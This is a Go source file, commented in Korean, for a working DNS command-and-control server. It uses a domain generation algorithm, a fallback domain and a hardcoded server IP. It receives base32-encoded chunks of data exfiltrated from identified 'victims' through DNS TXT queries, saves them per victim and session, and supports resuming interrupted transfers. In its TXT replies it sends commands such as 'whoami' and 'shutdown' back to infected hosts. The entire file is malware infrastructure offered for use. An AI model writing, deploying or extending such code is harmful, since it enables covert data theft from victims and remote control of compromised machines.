// main.go - DNS C2 서버 (DGA & Resume 지원)
// - 클라이언트의 DGA 기반 요청 수신
// - init.<victim_id>.<domain> TXT 질의로 재전송 재개 상태 반환
// - 클라이언트가 전송하는 base32 청크를 logs/results/<victim_id>/chunk{idx:06}.b64로 저장
// - TXT 응답으로 "ACK:{chunk_id}|CMD:{command}" 전송

package main

import (
	"encoding/base32"
	"fmt"
	"log"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/miekg/dns"
)

const (
	listenAddr = ":53"
	logPath    = "/root/dns-c2/logs/raw/dns_query.log"
	resultPath = "/root/dns-c2/logs/results"
	vpsIP      = "178.128.53.254"
)

var (
	// DGA 설정
	config = map[int]struct {
		seed  int
		shift int
		mod   int
		tlds  []string
	}{
		1: {62, 7, 8, []string{"ml", "org", "net", "com", "pw", "eu", "in", "us"}},
	}
	
	// 고정 도메인 및 명령
	fixedDomain = "pintruder.com" // fallback domain
	commands    = map[string]string{"default": "whoami"}

	// 피해자별, 세션별 마지막 수신 청크 번호
	latestChunk = make(map[string]map[string]int)
)

// Bit rotations
func ror32(v, s uint32) uint32 {
	v &= 0xFFFFFFFF
	return (v >> s) | (v << (32 - s)) & 0xFFFFFFFF
}

func rol32(v, s uint32) uint32 {
	return (v << s) | (v >> (32 - s)) & 0xFFFFFFFF
}

// DGA 도메인 생성
func dga(date time.Time, configNr, domainNr int) string {
	c := config[configNr]
	period := date.Year()*1000 + (int(date.Month())-1)*30 + (date.Day() / 21)
	t := ror32(0xB11924E1*uint32(period+0x1BF5), uint32(c.shift))
	if c.seed != 0 {
		t = ror32(0xB11924E1*(t+uint32(c.seed)+0x27100001), uint32(c.shift))
	}
	t = ror32(0xB11924E1*(t+uint32(date.Day()/2)+0x27100001), uint32(c.shift))
	t = ror32(0xB11924E1*(t+uint32(date.Month())+0x2709A354), uint32(c.shift))
	nr := rol32(uint32(domainNr%c.mod), 21)
	s := rol32(uint32(c.seed), 17)
	r := (ror32(0xB11924E1*(nr+t+s+0x27100001), uint32(c.shift)) + 0x27100001) & 0xFFFFFFFF
	length := (r % 11) + 5
	domain := ""
	for i := 0; i < int(length); i++ {
		r = (ror32(0xB11924E1*rol32(r, uint32(i)), uint32(c.shift)) + 0x27100001) & 0xFFFFFFFF
		domain += string(r%25 + 'a')
	}
	domain += "."
	r = ror32(r*0xB11924E1, uint32(c.shift))
	tldI := ((r + 0x27100001) & 0xFFFFFFFF) % uint32(len(c.tlds))
	domain += c.tlds[tldI]
	return domain
}

// 주기적으로 default 명령 갱신
func updateCommands() {
	cmdList := []string{"whoami", "shutdown", "status"}
	idx := 0
	for {
		time.Sleep(60 * time.Second)
		commands["default"] = cmdList[idx%len(cmdList)]
		log.Printf("명령 업데이트: %s", commands["default"])
		idx++
	}
}

// 로그 파일 기록
func saveLog(entry string) {
	f, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("로그 저장 실패: %v", err)
		return
	}
	defer f.Close()
	f.WriteString(entry + "\n")
}

func atoi(s string) int {
    i, _ := strconv.Atoi(s)
    return i
}

// 청크를 파일로 저장 (중복 허용, 덮어쓰기)
func saveChunk(victim, session, idx, data string) error {
    victimDir := filepath.Join(resultPath, victim)
    os.MkdirAll(victimDir, 0755)
    sessionDir := filepath.Join(victimDir, fmt.Sprintf("session%s", session))
    os.MkdirAll(sessionDir, 0755)
    filePath := filepath.Join(sessionDir, fmt.Sprintf("chunk%06d.b64", atoi(idx)))
    if _, err := os.Stat(filePath); err == nil {
        log.Printf("중복 발견, 덮어쓰기 시도: %s/%s/%s", victim, session, idx)
    }
    err := os.WriteFile(filePath, []byte(data), 0644)
    if err != nil {
        log.Printf("파일 쓰기 실패: %s/%s/%s, 오류: %v", victim, session, idx, err)
        return err
    }
    // Validate the file was written
    if _, err := os.Stat(filePath); err != nil {
        log.Printf("파일 검증 실패: %s/%s/%s, 오류: %v", victim, session, idx, err)
        return fmt.Errorf("file validation failed: %v", err)
    }
    log.Printf("파일 쓰기 성공: %s/%s/%s", victim, session, idx)
    return nil
}

// DGA 또는 고정 도메인 유효성 검사 (수정안)
func validDomain(qname string) bool {
    // qname에는 예: "000001.xxx.yyy.c7d173.abcdef.ml" 같은 전체 FQDN이 들어온다.
    parts := strings.Split(qname, ".")
    if len(parts) < 2 {
        return false
    }

    // 마지막 두 레이블을 조합 (예: "abcdef.ml" 또는 "pintruder.com")
    suffix := parts[len(parts)-2] + "." + parts[len(parts)-1]

    now := time.Now().UTC()
    // DGA 리스트 중 하나와 일치하는지 확인
    for i := 0; i < 20; i++ {
        if suffix == dga(now, 1, i) {
            return true
        }
    }
    // 고정 도메인과 일치하는지 확인
    if suffix == fixedDomain {
        return true
    }
    return false
}


// DNS 요청 핸들러
func handleRequest(w dns.ResponseWriter, r *dns.Msg) {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Compress = false

	for _, q := range r.Question {
		qname := strings.TrimSuffix(strings.ToLower(q.Name), ".")
		now := time.Now().UTC()
		// 요청 로그
		logEntry := fmt.Sprintf("%s | 도메인: %s | 타입: %s | 클라이언트: %s",
			now.Format(time.RFC3339), qname, dns.TypeToString[q.Qtype], w.RemoteAddr().String())
		fmt.Println(logEntry)
		saveLog(logEntry)

		// A 레코드: 도메인 생존 확인
		if q.Qtype == dns.TypeA {
			if validDomain(qname) {
				a := &dns.A{
					Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60},
					A:   net.ParseIP(vpsIP),
				}
				msg.Answer = append(msg.Answer, a)
			} else {
				msg.SetRcode(r, dns.RcodeNameError)
			}
			w.WriteMsg(msg)
			continue
		}

		// TXT 레코드: state 질의 또는 데이터 청크
		if q.Qtype == dns.TypeTXT {
			// 재전송 재개 (init)
			if strings.HasPrefix(qname, "init.") {
				parts := strings.Split(qname, ".")
				if len(parts) >= 3 {
					victim := parts[2] // victim_id is third part in init.<session_id>.<victim_id>.<domain>
					session := parts[1] // session_id is second part (ZIP 파일 이름 해시로 간주)
					// 새로운 세션에 대해 last_chunk를 -1로 초기화
					if _, exists := latestChunk[victim]; !exists {
						latestChunk[victim] = make(map[string]int)
					}
					if _, exists := latestChunk[victim][session]; !exists {
						latestChunk[victim][session] = -1 // 새 ZIP 파일에 대해 초기화
					}
					last := latestChunk[victim][session]
					state := fmt.Sprintf("STATE:{\"last_chunk\":%d}", last)
					txt := &dns.TXT{
						Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 60},
						Txt: []string{state},
					}
					msg.Answer = append(msg.Answer, txt)
				}
				w.WriteMsg(msg)
				continue
			}

			// 도메인 유효성 확인
			if !validDomain(qname) {
				msg.SetRcode(r, dns.RcodeNameError)
				saveLog(fmt.Sprintf("%s | NXDOMAIN 응답: %s", now.Format(time.RFC3339), qname))
				w.WriteMsg(msg)
				continue
			}

			// 청크 파싱
			parts := strings.Split(qname, ".")
			// 청크 저장 로직 (기존과 동일하지만 session_id가 ZIP 파일 이름 해시로 사용됨)
			if len(parts) < 5 { // Expecting <idx>.<part1>.<part2>.<session_id>.<victim_id>.<domain>
				msg.SetRcode(r, dns.RcodeNameError)
				saveLog(fmt.Sprintf("%s | 잘못된 쿼리 형식: %s, 최소 5개 부분 필요", now.Format(time.RFC3339), qname))
				w.WriteMsg(msg)
				continue
			}
			chunkIdx := parts[0]
			part1 := parts[1]
			part2 := parts[2]
			session := parts[3] // Session ID is fourth part (ZIP 파일 이름 해시)
			victim := parts[4]  // Victim ID is fifth part

			// Ensure latestChunk[victim] is initialized
			if _, exists := latestChunk[victim]; !exists {
				latestChunk[victim] = make(map[string]int)
			}
			if _, exists := latestChunk[victim][session]; !exists {
				latestChunk[victim][session] = -1
			}

			// base32 데이터 복원 및 저장
			b32data := part1 + part2
			b32data = strings.ReplaceAll(b32data, "-", "+")
			b32data = strings.ReplaceAll(b32data, "_", "/")
			paddingNeeded := (8 - len(b32data) % 8) % 8
			b32data += strings.Repeat("=", paddingNeeded)
			saveLog(fmt.Sprintf("%s | Base32 원본 데이터: %s/%s/%s, 데이터: %s", now.Format(time.RFC3339), victim, session, chunkIdx, b32data))
			_, err := base32.StdEncoding.DecodeString(strings.ToUpper(b32data))
			if err != nil {
				saveLog(fmt.Sprintf("%s | 디코딩 실패: %s/%s/%s, %v", now.Format(time.RFC3339), victim, session, chunkIdx, err))
			} else {
				err2 := saveChunk(victim, session, chunkIdx, b32data)
				if err2 == nil {
					idxInt := atoi(chunkIdx)
					if idxInt > latestChunk[victim][session] {
						latestChunk[victim][session] = idxInt
					}
					saveLog(fmt.Sprintf("%s | 저장됨: %s/%s/%s", now.Format(time.RFC3339), victim, session, chunkIdx))
				} else {
					saveLog(fmt.Sprintf("%s | 저장 실패: %s/%s/%s, %v", now.Format(time.RFC3339), victim, session, chunkIdx, err2))
				}
			}

			// ACK 응답
			txt := &dns.TXT{
				Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 60},
				Txt: []string{fmt.Sprintf("ACK:%s|CMD:%s", chunkIdx, commands["default"])},
			}
			msg.Answer = append(msg.Answer, txt)
			w.WriteMsg(msg)
			continue
		}

		// 그 외는 Not Implemented
		msg.SetRcode(r, dns.RcodeNotImplemented)
		w.WriteMsg(msg)
	}
}

func main() {
	dns.HandleFunc(".", handleRequest)
	go updateCommands()

	udpSrv := &dns.Server{Addr: listenAddr, Net: "udp"}
	tcpSrv := &dns.Server{Addr: listenAddr, Net: "tcp"}

	go func() {
		log.Println("[+] UDP 서버 시작")
		if err := udpSrv.ListenAndServe(); err != nil {
			log.Fatalf("UDP 서버 실패: %v", err)
		}
	}()
	go func() {
		log.Println("[+] TCP 서버 시작")
		if err := tcpSrv.ListenAndServe(); err != nil {
			log.Fatalf("TCP 서버 실패: %v", err)
		}
	}()
	select {}
}
